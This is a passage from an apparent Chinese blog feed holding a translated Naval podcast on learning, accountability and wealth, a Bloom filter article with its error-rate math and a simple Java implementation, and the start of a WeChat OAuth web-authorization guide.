study）。但它们只是一些趣闻轶事，它们试图通过向你抛出大量数据点来帮助你进行模式匹配，但事实是，在你设身处地思考之前，你永远不能完全理解它们，就像你无法重复打造一个可口可乐一样。但是，你会发现博弈论、心理学、伦理学、数学、计算机和逻辑学中的这些基本概念才会更好地帮到你。这也是我为什么会更专注于基础科学、基础逻辑的原因。我会培养对阅读的热爱，包括阅读那些我们明知道不应该阅读的所谓垃圾。你不必（只）读经典。阅读是你进行自我教育的基础。 着手做比光想要快得多 Nivi：你之前所说的“做比看快”是什么意思呢？ Naval：这涉及到学习曲线的话题，人们总是想方设法的优化自己的学习曲线。尽管我也是一个播客博主，但我不喜欢播客的原因之一是，播客无法让我最快的获取知识和信息。我是一个很好的读者，或者说是一个很快的读者，我能读得很快，但我只能以一定的速度听。我知道人们听的时候都是二倍速，三倍速，但那时每个人听起来都像一只花栗鼠，很难再回头看，抓重点，很难精确定位片段并记笔记，等等。 同样地，很多人认为他们可以通过观察别人做的事情，甚至通过阅读别人做的事情，变得非常熟练。比如刚提到的商学院的案例研究，就是一个非常典型的例子。他们研究其他人的生意，但实际上，你开一个自己的柠檬汽水摊，甚至在街上开一家小杂货店，都会学到比书本上多得多的经营生意的知识。这就是你在工作中要学习的方法，因为很多微妙的东西在你真正进入这个行业之前是不会真正懂得的。 例如，现在人人都喜欢研究心理学。你去看看Farnam Street，读读Poor Charlie’s Almanack*，你可以学习所有不同的心理模式。但哪个更重要？你更常应用哪些？在什么情况下哪一个更重要？这其实是最难的部分。比如，我从心理学研究中最大的收获是，委托-代理问题在现实世界中的驱动力太强大了，这本质是一个激励问题。它让我明白，针锋相对的重复囚徒困境是最值得了解的博弈论。在那之后你几乎可以把博弈论理论书束之高阁了。 顺便说一下，学习博弈论的最好方法是自己设计游戏，自己亲身体验。虽然我从没读过博弈论的书，但我认为自己非常擅长博弈论实践。我从来没有打开过一本博弈论的书，从未尝试在里面发现任何一个我没想到的结果。原因是我从小玩各种游戏，和各种各样的朋友在游戏中碰到各种各样的实际情况，所以这对我来说只是第二天性。实践会告诉你一切你想知道的答案。 “执行”迭代的次数决定着你的学习曲线执行本身是一件很微妙的事请，它包含着很多东西。比如说，我想学习如何经营一家企业。如果我在每天上班的地方重复做同样的事情，比如说我在街上开了一家零售店，每天的任务就是在货架上摆满食物和酒，我不会学到很多东西，因为我每天只是在不断重复。因此，即使我花了几千个小时，但我也只是花了几千个小时做同样的事情。而如果在这个过程中我进行了数千次迭代，那结果就会不一样了。因此，学习曲线是需要迭代的，而不是重复。 但如果我在商店里每天尝试新的营销实验，我不断地改变库存，不断地改善品牌策略，不断尝试新的讲故事的方法，不断地拓展增大客流量的在线渠道，我试着在不同的时间营业，并且经常有目的地四处走走，和其他店主交谈，拿到他们的书，弄清楚他们是如何经营自己的生意的。真正影响学习曲线的是迭代次数。迭代次数越多，收获的就越多，学习速度就越快。而不仅仅是投入的时间长短的问题。 如果你愿意每天流一点血，你可能在未来的人生路上赢得很多虽然世界为我们提供着一次又一次做同样事情的机会，但事实上，如果我们能从零开始寻找新的方法，世界会呈现出不一样的精彩。 第一次尝试新事物是很痛苦的，因为你正徘徊在不确定的领域，很有可能你会失败。因此你只需要不断让自己适应频繁的小失败（bleed a little）。 Nassim Taleb也谈到了这一点。他靠做一个基本上依赖黑天鹅的商人的生意发家致富。Nassim Taleb通过每天损失一点点钱来赚钱，然后在一个偶然的时机，当一件被常识定义为不可能发生的事情发生在其他人身上时，他会赚很多钱。 虽然大多数人每天都想一夜暴富，但相应的，他们需要承担爆炸式的风险，做好破产的心理准备。 如果说你在自然界里割伤了，然后每天都在流血，你最终会因失血而死亡，你必须想办法及及时想办法挽救生命。但其实现实生活没那么夸张，我们并不是每天都在流血，流血在这里只是一个比喻，每天让自己损失一点点。 但现实是，大部分人都不这么做，相反他们每天都在追求着小的胜利，这最终会被证明是不合算的。我想说的是，如果你愿意每天都流一点点血，将来你会赢一笔大的。 其实，这就是创业精神，企业家们每天都在流血（bleed a little）。他们不是在赚钱，他们是在赔钱，而且他们总是亚历山大，因为所有的责任都在他们身上，但是当他们赢了，他们就会大赚一笔，所以总体上来看他们会赚得更多。 第十九条：勇敢承担责任才能获得影响力勇敢冒险你就会在社会上获得影响力 你需要通过责任获得影响力Nivi: 我们何不谈谈责任呢，我觉得这很有趣，我估计你对此有自己独特的看法。因此，你的关于责任的第一条推文是，“拥抱责任，以自己的名义承担商业风险。社会将以责任、公平和影响力来回报你。” Naval: 是啊，所以要想发财，你需要杠杆。杠杆来自于劳动力、资本，也可能是通过代码和媒体。但其中的大多数，比如劳动力和资本，必须来自于他人的给予。对于劳动力，必须是有人愿意跟随你；对于资本，必须有人给你钱或资产来让你管理和使用。 所以要得到这些，你必须建立信誉，而且你必须尽可能以自己的名义去做，当然这也是有风险的。所以责任是一把双刃剑。它能让你在事情顺利的时候收获信誉，在事情糟糕的时候承受失败的冲击。 以自己的名义承担商业风险从这个意义上说，那些在各种事物上贴上自己标签的人并不愚蠢，他们只是对自己有信心。也许最终结果是愚蠢的，但如果你看到一个坎耶、奥普拉、特朗普、马斯克或其他类似的人，这些人之所以可以凭借自己的名字致富，是因为他们的名字就是强大的敲门砖。 不管你如何看待特朗普，你必须意识到，这家伙的名字就是世界名片。你为什么要去特朗普赌场？只是因为是特朗普。你为什么要去特朗普大厦？也是因为特朗普。 到了投票的时候，我想很多选民只是进去说“特朗普”，他们认出了这个名字，所以这个名字得到了回报（获得选票）。 奥普拉也是同样的，她把某样东西打上自己的标签，当商品到达人们手中，她的名字就是这些商品的招牌。 这些人在坚持把自己的名字打造成招牌的同时当然也面临着一系列的风险。显然，特朗普现在可能被世界上的一大部分人憎恨着，也同样是因为特朗普式的风格。 把你的名字公之于众，你就会成为一个名人，而名声也有很多缺点。隐姓埋名、有钱总比穷出名好，但即便是名利双收，也有很多不利因素。你需要在公众的眼皮子底下生活。 一个运作良好的团队对每个职位都有明确的责任分工责任感是非常重要的，当你正在开发一个产品，或者你在一个团队中工作，或者你在一个企业中工作时，我们就会不断地提醒自己成为一个团队的一员是多么的重要。这的确是非常重要的。 我们在社交方面的很多训练都告诉我们不要强出头。就像中国的一句俗语，枪打出头鸟，别紧张，但是我要说的是，一个真正运作良好的团队规模很小，对每一个不同的部分都有明确的责任分工。 你可以说，“好吧，这个人负责制造产品，这个人负责信息发布，这个人负责筹款，这个人负责定价策略，也可能负责在线广告。“所以如果有人搞砸了，你就知道到底是谁负责。同时，如果事情进展顺利，你也清楚地知道是谁做得很好。 如果你有一个很小的团队，并且你已经清楚地划分了责任，那么你仍然可以保持很高的责任感。问责制在面对结果时显得真的很重要，不然就会出现，如果失败了，每个人都会互相指责，如果成功了，每个人都会站出来争夺功劳。 我们在学校的时候都有过这样的经历，有一个小组作业要做，里面可能有几个人做了很多工作，然后有一些人只是做了很多哗众取宠的工作或者强行给自己做的工作加戏。我们从小就习以为常，但说出来难免会感到不舒服。 能在公众面前坦然面对失败的人都有很大的能量明确责任很重要。没有责任感，你就没有动力；没有责任感，就无法建立信誉。但你要冒险，你冒着失败的风险冒着被羞辱的危险，你冒着以自己名义承受失败的风险。 幸运的是，在现代社会，不再有债务人的监狱，人们也不会因为失去别人的钱而坐牢或被处死，但与生俱来的，我们不会以自己的名义在公共场合失败。那些以自己的名义在公共场合面对失败的人，实际上拥有很大的能量。 例如，我讲一个个人轶事。直到2013年，2014年，我的公众形象完全围绕着创业和投资。直到2014年、2015年左右，我才开始谈论哲学、心理学等等。 这让我有点紧张，因为我是以自己的名义做的。肯定有业内人士通过背后悄悄戳我，比如“你在干什么？你要结束你的职业生涯了吗？这太愚蠢了。” 我有点同意了，的确，我冒险了。 当你把你的名字放在那里，你就要冒着某些风险。但同时你也会得到回报，你会得到好处的。 第三十五条：冷静的头脑，健康的身体，充满爱的家庭当你变得富有时，你会发现这些都不是你一直以来追求的 Nivi：最后一条关于长期工作的推特是：“当你最终变得富有时，你会意识到这些并不是你最初想要的。” Naval：这本身就是一个能谈论很久的话题。首先，我认为这是一个非常聪明的结论，它解放了那些说“致富有什么意义？”的人们的思想武装。有很多人喜欢以德服人，反对创造财富或赚钱的想法。这其实也没错。是的，钱能解决你所有能用钱解决的问题，但钱也不是万能的。 当你赚了一大笔钱后，你首先意识到你仍然是同一个人。如果你本来快乐，你就还是快乐的。如果你本来不快乐，你就会不快乐。如果你平静、满足、平和，你还是那个人。我认识很多非常富有的人，他们身材非常不好。我也认识很多有钱人，他们的家庭生活很糟糕。我同时也知道很多有钱人，他们内心很混乱。 平静的头脑，健康的身体和充满爱的家庭必须要经营我想到我之前发的另一条推特，也是我最喜欢的一条。它不一定是最有见地的，也不一定是最有用的，这甚至不是我想的最清楚的。但那里面有一个非常确定的事实，它引起了共鸣。 “健康的身体，平静的头脑，充满爱的家庭。这些东西是买不来的，必须要经营才能得到。” 即使你拥有世界上所有的钱，你也不会拥有这三样东西。Jeff Bezos（亚马逊董事长）还得健身，他也得为他的婚姻努力，他的内在精神状态仍然很难不被外部事件所影响。这将取决于他内心的平静与安宁。因此，我认为这三件事——你的身体健康，你的心理健康和你的亲密关系是你必须要培养的。他们能给你带来比任何金钱都多的安宁和幸福。 关于平静内心状态的实用性建议如何才能保持内心平静，这个话题是我一直在研究的。我大概有100条这个方面的推特。在这个话题上，最近经常会遭到至少50种不同形式的攻击。所以我一直在犹豫要不要做，因为我想针对一种非常特殊的人群。 有很多人不相信研究内在状态是有用的，他们太注重外在。没关系，这样也的确没什么问题。这就是“如何致富”推特系列的目的。有很多人认为唯一值得努力的就是彻底解放(complete liberation)，就像，你成了佛。他们会怀疑过程中的任何东西，认为它们毫无用处。但事实是绝大多数人没法儿成佛不是吗？ 我想创建一个新的推特系列，来为那些想要一个更平静的内在的人们提供实用的建议。一套理解、分辨半真半假和真理的理论，如果你能正确地吸收它们，这些都是指向你已经拥有的想法和经验的指针；如果你把这些理论慢慢融会贯通，它将帮助你、引导你进入一个更平静的内在状态，这就是我想做的。 健身是另一个大问题，我不是这方面的专家，推特上有很多比我更擅长健身的专业人士。 很多离婚案例是为了钱，很多争吵是因为内心恐惧我认为，一个充满爱的家庭和人际关系实际上是自然而然地从其他事情中脱颖而出的。如果你有一个冷静的头脑，你已经赚了钱，你应该有良好的关系。你没有理由不这样做，很多离婚都是为了钱，不幸的是，这就是现实，有了钱但是丢失了家庭这部分。 很多外在的纷争主要是因为你的内在状态不好。当你内心自然平静的时候，你会选择更少的争斗，你会变得更有爱心而不期待任何回报，这会让你应对外部关系更加得心应手。 Nivi：总结一下，钱能解决你的关于金钱的问题，金钱可以让你在物质世界中获得自由。金钱能给你不去做你不想做的事情的自由。 Naval：是啊。对我来说，金钱的最终目的是让你不必在某个特定的地方的某个特定的时间，做任何你不想做的事情。 第三十六条：没有什么快速致富的方法别相信能快速致富的鬼话，那些人只是想从你身上赚钱而已 Nivi：我们跳过了一条推文，因为我想涵盖所有关于长期话题的推文。我们跳过的那条推特是，“世界上没有快速致富的捷径，如果谁告诉你有，那不过是他想从你这里发财罢了。” Naval：我们说回有效率的世界。如果有一种简单的致富方式，那就是已经被开发了。有很多人会向你推销如何赚钱的产品，比如他们总是卖给你一些79-95美元的课程或一些有声读物，或研讨会门票。这没什么对错，人们总是需要谋生。他们可能真的有很好的建议，但如果他们给你可行的、高质量的建议，承认这（致富）是一个艰难的旅程，会花很多时间，那么我认为这是现实的。但是，如果他们卖给你一些快速致富的各种线上线下的产品，他们只是想从你身上赚钱，你要掂量一下它的价值。 我们不放广告，因为我们知道那只会损害信誉关于整个推特风暴和这个播客，我想强调的一件事是我们这里没有广告，也不收任何费用。我们不卖任何东西。不是因为我不想赚更多的钱，赚更多的钱总是好的。但是，它会完全破坏企业的信誉。如果我说，“嘿，我知道如何致富，我要把它卖给你。“这就毁了它。 我年轻的时候就开始思考致富的话题，我最喜欢的书之一就是《如何致富》，作者是Felix Dennis，《Maxim》杂志的创始人，一位去世的亿万富翁。他写了很多疯狂的东西，但他对财富的理解真的好。 但每当我读到他或GoDaddy创始人鲍勃·帕森斯或安德鲁·卡内基的作品时，这些已经非常富有的人写的东西，他们显然是在其他领域发家致富的，而不是靠推销如何致富的方法。他们不是想从你身上赚钱。他们显然是想赢得一些地位和一些自尊，对吧，你总是要有做某事的动机。但是，至少这是他们没有撒谎的一个更清晰的理由。 每个创始人都会对他的员工撒谎在某种程度上，每个创始人都要对公司的每个员工撒谎。他们必须让员工觉得，你为我工作比做你自己想做的事，为你自己工作（创业）要好。同样作为一个创始人，但对此我总是很难接受。 于是我开始尝试一些保持诚实的方法，我招募了一些有企业家精神的员工，然后告诉他们，“你们可以在这个公司成为企业家，当你们准备好开始自己的事业的那一天，我将支持你们。我永远不会妨碍你创业。但在你想开始一些新东西之前，这里可能是一个好地方，让你学习如何构建一个良好的团队，建立一个好的企业文化，通过打磨自己的技能找到适合的产品市场，见更多更加优秀的人、和他们交流碰撞，直到最终想通自己到底想做什么。因为定位、时机、以及必要的深思熟虑，在开始创业时很重要。” 但我从来不会做一些无谓的监督，告诉员工“你必须在早上8点之前到你的办公桌。”因为我自己就不会在早上8点之前坐在办公桌前，我想要自由。这就像告诉他们你今天很擅长做董事，明天你就会成为副总裁。这种话我自己都不相信。 任何提供致富建议的人，去想想别的赚钱方式吧就好像，你不会想从一个胖子那里学到如何保持健康；也不会想从一个抑郁的人那里学到如何快乐。所以，你不会想从一个穷人那里学习如何致富，也一定不想从一个通过告诉别人如何致富来赚钱的人那里学习如何致富。想想都奇怪不是吗？ Nivi：任何时候，如果你看到有人按照大师的建议致富了，只要记住，在任何随机事件中，如果你持续足够长的时间，如果有足够多的人参与其中，你就会得到想要的结果。 Naval：这里面存在着幸存者偏差，这也是为什么当商业记者和经济学家谈论私营公司时，你可以完全忽视他们的原因。 我不会指名道姓，但当一位著名的经济学家对比特币大加抨击，或者当一名商业记者攻击最新一家即将上市的公司时，这完全是胡说八道。那些人什么都没做，他们只是「专业的评论家」。他们对赚钱一无所知。他们只知道如何通过吐槽和批评来博眼球。你要是不停的被他们洗脑可就太蠢了。 最后我想引用纳西姆·塔勒布*的一句话，我很喜欢他说的话，“如果你想成为一个哲学家，先当国王，再当哲学家。”不是先成为哲学家，再成为国王。” Nivi：我很高兴你提到了塔勒布，我想请大家记住他成名作的书名《随机骗局》。 Naval：我们在这期播客中有些模糊的原因之一是，我们试图去讨论值得长期遵循的原则，而不仅仅是告诉你昨天中奖的彩票号。 第三十七条：产品化你自己找出你最擅长的，并尽可能多地运用杠杆 Nivi：你用两个词概括了整个推特风暴。“产品化（Productize）你自己。” Naval：产品化你自己这个概念的意思是：你自己是独特的、有责任心的，产品化需要独特的技能和杠杆。所以所有这些部分，你可以把它们合并成这两个词。 如果你想要长期致富，你应该问自己：“这是我的真实想法吗？”我在打造的是我自己吗？然后，“我在生产它吗？”我在规模化它吗？我是在用劳动力还是资本，代码还是媒体来衡量？所以这是一个非常方便、简单的记忆方法。 这是什么播客？这是一个叫做Naval的播客。我实际上是在用播客在产品化自己的一部分 Nivi：你要弄清楚你有什么特别擅长的，或者你有什么特别之处，然后尽可能地运用杠杆。在这种情况下你不是在刻意赚钱，赚钱甚至也不是一种技能。你就是在做你自己，探索成千上百种方式找到真正的你。 找到让你富有、健康和有创造力的爱好Naval：赚钱应该取决于你是谁和你喜欢做什么。另一条我特别喜欢的推特是…这不是我说的，是别人发过的。他们说“找三个爱好”。一个能让你赚钱，一个能让你保持健康，一个能让你富有创造力。” 我会稍微改变一下。我会说，找到三个爱好，一个让你赚钱，一个让你健康，一个让你更聪明。就我而言，我的爱好是阅读，赚钱，因为我喜欢与初创公司合作。要么投资，要么集思广益，要么开始行动。我很喜欢创业初期的创意和创造阶段。 至于让你保持健康的爱好，我真的没有。我最喜欢的是瑜伽，但那是我崩溃的地方。我认为，那些早年发现冲浪、游泳、网球或某种他们一生中大部分时间都在做的运动的人是非常幸运的，因为他们发现了一种使他们健康的爱好。 胖车库是一个有意思人类的收集计划（开发者、创业者、自由职业者，还有你）和DAO去中心化协作实验室，看看大家都在不同领域做着什么样新的尝试，希望给你未来的可能性提供一些想象力。 BitFuture为传统行业提供区块链咨询、公链开发、交易所开发、DApp开发、商业模式设计、经济模型设计、社区建设与运营方案等全栈链改服务，在众多行业和业务中成功交付了解决方案]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bloom Filter]]></title>
    <url>%2Farticles%2FBloom-Filter%2F</url>
    <content type="text"><![CDATA[Bloom Filter是一种空间效率很高的随机数据结构，它利用位数组很简洁地表示一个集合，并能判断一个元素是否属于这个集合。Bloom Filter的这种高效是有一定代价的：在判断一个元素是否属于某个集合时，有可能会把不属于这个集合的元素误认为属于这个集合（false positive）。通常应用在一些需要快速判断某个元素是否属于集合，但是并不严格要求100%正确的场合。而在能容忍低错误率的应用场合下，Bloom Filter通过极少的错误换取了存储空间的极大节省。 集合表示和元素查询下面我们具体来看Bloom Filter是如何用位数组表示集合的。初始状态时，Bloom Filter是一个包含m位的位数组，每一位都置为0。 为了表达$S=\{x1, x2,…,xn\}$这样一个n个元素的集合，Bloom Filter使用k个相互独立的哈希函数（Hash Function），它们分别将集合中的每个元素映射到$\{1,…,m\}$的范围中。对任意一个元素$x$，第i个哈希函数映射的位置$hi(x)$就会被置为$1（1≤i≤k）$。注意，如果一个位置多次被置为1，那么只有第一次会起作用，后面几次将没有任何效果。在下图中，k=3，且有两个哈希函数选中同一个位置（从左边数第五位）。 在判断y是否属于这个集合时，我们对y应用k次哈希函数，如果所有$hi(y)$的位置都是$1（1≤i≤k）$，那么我们就认为y是集合中的元素，否则就认为y不是集合中的元素。下图中y1就不是集合中的元素。y2或者属于这个集合，或者刚好是一个false positive。 错误率估计前面我们已经提到了，Bloom Filter在判断一个元素是否属于它表示的集合时会有一定的错误率（false positive rate），下面我们就来估计错误率的大小。在估计之前为了简化模型，我们假设$kn&lt;m$且各个哈希函数是完全随机的。当集合$S=\{x1, x2,…,xn\}$的所有元素都被k个哈希函数映射到m位的位数组中时，这个位数组中某一位还是0的概率是： $ p'=(1-\frac{1}{m})^{kn} ≈ e^{-\frac{kn}{m}} $ 其中$\frac{1}{m}$表示任意一个哈希函数选中这一位的概率（前提是哈希函数是完全随机的），$(1-\frac{1}{m})$表示哈希一次没有选中这一位的概率。要把$S$完全映射到位数组中，需要做$kn$次哈希。某一位还是$0$意味着$kn$次哈希都没有选中它，因此这个概率就是$(1-\frac{1}{m})^{kn}$。令 $p’=e^{-\frac{kn}{m}}$是为了简化运算，这里用到了计算e时常用的近似： $\lim_{x \to \infty}(1-\frac{1}{x})^{-x} = e $ 令ρ为位数组中0的比例，则ρ的数学期望$E(ρ)= p’$。在ρ已知的情况下，要求的错误率（false positive rate）为： $ (1-ρ)^k ≈ (1-p')^k ≈ (1-p)^k $ $(1-ρ)$为位数组中1的比例，$(1-ρ)^k$就表示k次哈希都刚好选中1的区域，即false positive rate。上式中第二步近似在前面已经提到了，现在来看第一步近似。$p’$只是$ρ$的数学期望，在实际中$ρ$的值有可能偏离它的数学期望值。M. Mitzenmacher 已经证明[2] ，位数组中0的比例非常集中地分布在它的数学期望值的附近。因此，第一步的近似得以成立。分别将$p$和$p’$代入上式中，得： $ f' = (1-(1-\frac{1}{m})^{kn})^k = (1-p')^k $ $ f = (1-e^{-\frac{kn}{m}})^k = (1-p)^k $ 相比$p’$ 和$f’$，使用$p$和$f$通常在分析中更为方便。 最优的哈希函数个数既然Bloom Filter要靠多个哈希函数将集合映射到位数组中，那么应该选择几个哈希函数才能使元素查询时的错误率降到最低呢？这里有两个互斥的理由：如果哈希函数的个数多，那么在对一个不属于集合的元素进行查询时得到0的概率就大；但另一方面，如果哈希函数的个数少，那么位数组中的0就多。为了得到最优的哈希函数个数，我们需要根据上一小节中的错误率公式进行计算。 先用$p$和$f$进行计算。注意到$f = e^{k\ln(1-e^{-\frac{kn}{m}})}$，我们令$g = k\ln(1-e^{-\frac{kn}{m}})$，只要让g取到最小，f自然也取到最小。由于$ p = e^{-\frac{kn}{m}}$，我们可以将g写成 $ g = -\frac{m}{n}\ln(p)\ln(1-p) $ 根据对称性法则可以很容易看出当$p = \frac{1}{2}$，也就是$k = ln(2)\frac{m}{n}$时，g取得最小值。在这种情况下，最小错误率f等于$\frac{1}{2}k ≈ (0.6185)\frac{m}{n}$。另外，注意到p是位数组中某一位仍是0的概率，所以$p = \frac{1}{2}$对应着位数组中0和1各一半。换句话说，要想保持错误率低，最好让位数组有一半还空着。 需要强调的一点是，$p = \frac{1}{2}$时错误率最小这个结果并不依赖于近似值$p$和$f$。同样对于$f’ = e^{k\ln(1 − (1 − \frac{1}{m})^{kn})}$，$g’ = k\ln(1 − (1 − \frac{1}{m})^{kn})$，$p’ = (1 − \frac{1}{m})^{kn}$，我们可以将$g’$写成 $ g' = \frac{1}{n\ln(1-\frac{1}{m})}\ln(p')\ln(1-p') $ 同样根据对称性法则可以得到当$p’ = \frac{1}{2}$时，$g’$取得最小值。 位数组的大小下面我们来看看，在不超过一定错误率的情况下，Bloom Filter至少需要多少位才能表示全集中任意n个元素的集合。假设全集中共有u个元素，允许的最大错误率为є，下面我们来求位数组的位数m。 假设$X$为全集中任取n个元素的集合，$F(X)$是表示$X$的位数组。那么对于集合$X$中任意一个元素x，在$s = F(X)$中查询x都能得到肯定的结果，即s能够接受x。显然，由于Bloom Filter引入了错误，s能够接受的不仅仅是X中的元素，它还能够$є (u - n)$个false positive。因此，对于一个确定的位数组来说，它能够接受总共$n + є (u - n)$个元素。在$n + є (u - n)$个元素中，s真正表示的只有其中n个，所以一个确定的位数组可以表示 个集合。m位的位数组共有2m个不同的组合，进而可以推出，m位的位数组可以表示 个集合。全集中n个元素的集合总共有 个，因此要让m位的位数组能够表示所有n个元素的集合，必须有 即： 上式中的近似前提是n和єu相比很小，这也是实际情况中常常发生的。根据上式，我们得出结论：在错误率不大于є的情况下，m至少要等于$n\log2(1/є)$才能表示任意n个元素的集合。 上一小节中我们曾算出当$k = \ln2· \frac{m}{n}$时错误率f最小，这时$f = \frac{1}{2}k = \frac{\frac{1}{2}m\ln2}{n}$。现在令$f≤є$，可以推出 这个结果比前面我们算得的下界$n\log2(1/є)$大了$\log2 e ≈ 1.44$倍。这说明在哈希函数的个数取到最优时，要让错误率不超过є，m至少需要取到最小值的1.44倍。 算法实现下面给出一个简单的Bloom Filter的实现代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import java.util.BitSet;import java.util.Random;/** Very basic implementation of *Bloom Filter*. * Things to improve further. * 1. Save it on disk to make it distributed. * 2. add additional constructor to take in false positive rate and calculate other parameters. * */public class BloomFilter&lt;T&gt; &#123; int howManyHashFunctions =1; /**How many elements are expected at max*/ int totalExpectedElements ; /**How many elements in filter at any point in time*/ int totalCurrentElements ; /**How many bits per element needs to be set**/ int bitsPerElement ; BitSet dataDictionaryBitSet; public BloomFilter(int howManyHashFunctions, int totalExpectedElements, int bitsPerElement)&#123; this.howManyHashFunctions =howManyHashFunctions; this.totalExpectedElements =totalExpectedElements; this.bitsPerElement=bitsPerElement; dataDictionaryBitSet = new BitSet(bitsPerElement * totalExpectedElements); &#125; /** Adding data in *Bloom Filter*. This will remember that this data was added. * @param data : The data which needs to be added in *Bloom Filter***/ public void add(T data) &#123; int[] hashCodes = generateMultipleHash(data ); for (int index =0 ; index&lt;hashCodes.length;++index) dataDictionaryBitSet.set(hashCodes[index]); ++totalCurrentElements; &#125; /**Find out if given data was previously added into filter. * @param data : The data which needs to be checked if it was previously added. * **/ public boolean exists(T data) &#123; int[] hashCodes = generateMultipleHash(data ); boolean exists = false; for (int index =0 ; index&lt;hashCodes.length;++index) &#123; if (dataDictionaryBitSet.get(hashCodes[index])) exists = true; else &#123; exists = false; break; &#125; &#125; return exists; &#125; /** Return how many element it has remembered. **/ public int size()&#123; return totalCurrentElements; &#125; /** generate multiple hash codes * @param data the data which needs to be * @return array with positive hashes with hash values from 0 to size of bit set array size */ public int[] generateMultipleHash(T data ) &#123; int[] positions = new int[howManyHashFunctions]; Random r = new Random(data.hashCode()); for (int i = 0; i &lt; howManyHashFunctions; i++) &#123; positions[i] = r.nextInt(dataDictionaryBitSet.size()); &#125; return positions; &#125;&#125; 总结在计算机科学中，我们常常会碰到时间换空间或者空间换时间的情况，即为了达到某一个方面的最优而牺牲另一个方面。Bloom Filter在时间空间这两个因素之外又引入了另一个因素：错误率。在使用Bloom Filter判断一个元素是否属于某个集合时，会有一定的错误率。也就是说，有可能把不属于这个集合的元素误认为属于这个集合（False Positive），但不会把属于这个集合的元素误认为不属于这个集合（False Negative）。在增加了错误率这个因素之后，Bloom Filter通过允许少量的错误来节省大量的存储空间。 自从Burton Bloom在70年代提出Bloom Filter之后，Bloom Filter就被广泛用于拼写检查和数据库系统中。近一二十年，伴随着网络的普及和发展，Bloom Filter在网络领域获得了新生，各种Bloom Filter变种和新的应用不断出现。可以预见，随着网络应用的不断深入，新的变种和应用将会继续出现，Bloom Filter必将获得更大的发展。 参考文献 Pei Cao. Bloom Filters - the math. Wikipedia. Bloom Filter. .fancybox img {margin:0 auto !important;}]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>Hash table</tag>
        <tag>大数据</tag>
        <tag>BitMap</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTful标准下的微信网页授权]]></title>
    <url>%2Farticles%2FRESTful%E6%A0%87%E5%87%86%E4%B8%8B%E7%9A%84%E5%BE%AE%E4%BF%A1%E7%BD%91%E9%A1%B5%E6%8E%88%E6%9D%83%2F</url>
    <content type="text"><![CDATA[微信网页授权流程 具体而言，可分为两步： 1、引导用户进入授权页面同意授权，获取code 【拉起授权页】 引导用户点击授权链接https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=CODE&amp;scope=SCOPE&amp;state=STATE#wechat_redirect 这里有两个参数比较注意的是：redirect_uri 授权成功后的跳转地址，授权作用域scope参数有两个值：snsapi_base和snsapi_userinfo。如果只需要获取openid则前者就够了，后者还可获取微信用户信息，前者的静默授权（不显示授权页面）功能也挺棒的。 若提示该链接无法访问，请检查参数是否填写错误，是否拥有scope参数对应的授权作用域权限。微信返回参数错误的原因一般有两种：一是在微信公众平台没有配置相应的参数；二是前端配置的接口参数与公众平台不一致。 具体参数说明 参数 是否必须 说明 appid 是 公众号的唯一标识 redirect_uri 是 授权后重定向的回调链接地址， 需要使用 urlencode 对链接进行处理,注意这个地址必须在公众号后台网页授权域名下 response_type 是 返回类型，填写code scope 是 应用授权作用域，snsapi_base （不弹出授权页面，直接跳转，只能获取用户openid），snsapi_userinfo （弹出授权页面，可通过openid拿到昵称、性别、所在地。并且， 即使在未关注的情况下，只要用户授权，也能获取其信息 ） state 否 重定向后会带上state参数，传递什么返回什么, 可以作为参数传递 wechat_redirect 是 无论直接打开还是做页面302重定向时候，必须带此参数 2、通过code换取网页授权access_token进而获取用户openid和其他用户信息【获取用户信息】 获取code后，请求以下链接获取access_tokenhttps://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code 参数说明 参数 是否必须 说明 appid 是 公众号的唯一标识 secret 是 公众号的appsecret code 是 填写第一步获取的code参数 grant_type 是 填写为authorization_code 正确时返回的JSON数据包如下： 1234567&#123; "access_token":"ACCESS_TOKEN", "expires_in":7200, "refresh_token":"REFRESH_TOKEN", "openid":"OPENID", "scope":"SCOPE" &#125; 拉取用户信息(需scope为 snsapi_userinfo) 如果网页授权作用域为snsapi_userinfo，则此时开发者可以通过access_token和openid拉取用户信息了。 http：GET（请使用https协议）https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN 参数说明 参数 是否必须 说明 access_token 是 网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同 openid 是 用户的唯一标识 lang 是 返回国家地区语言版本，zh_CN 简体，zh_TW 繁体，en 英语 正确时返回的JSON数据包如下： 1234567891011&#123; "openid":" OPENID", "nickname": NICKNAME, "sex":"1", "province":"PROVINCE", "city":"CITY", "country":"COUNTRY", "headimgurl": "http://thirdwx.qlogo.cn/mmopen/g3MonUZtNHkdmzicIlibx6iaFqAc56vxLSUfpb6n5WKSYVY0ChQKkiaJSgQ1dZuTOgvLLrhJbERQQ4eMsv84eavHiaiceqxibJxCfHe/46", "privilege":[ "PRIVILEGE1" "PRIVILEGE2" ], "unionid": "o6_bmasdasdsad6_2sgVt7hMZOPfL"&#125; 注意：unionid 只有在开发者将公众号绑定到微信开放平台帐号后，才会出现该字段。 到此，微信网页授权也就结束了，更多请查看微信网页授权文档 针对RESTful规范修改现代项目开发基本上都是采用完全的前后端分离开发模式，后端采用统一规范返回json或者jsonp等给前端，而前端不再是伪静态页面，而是存粹的静态HTML,用户请求基本上都是通过ajax此类异步请求完成后端数据接收的。而在官方推荐的流程中，redirect_url被定向到后端处理接口，处理完成后使用header等强制跳转处理后的页面的方式在此处就行不通了，因为它打破了前期统一制定好的代码规范。那么 redirect_url 定向到前端页面，让前端来接收Code是否可行呢？ 答案是：可行。 超文本标记语言（HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。HTML是一种基础技术，常与CSS、JavaScript一起被众多网站用于设计网页、网页应用程序以及移动应用程序的用户界面[3]。网页浏览器可以读取HTML文件，并将其渲染成可视化网页。HTML描述了一个网站的结构语义随着线索的呈现，使之成为一种标记语言而非编程语言。 —–wiki 我们知道html不是编程语言，是不能如php、java等编程语言那样获取用户请求参数的，但是GET请求例外,因为GET参数通过URL传递, 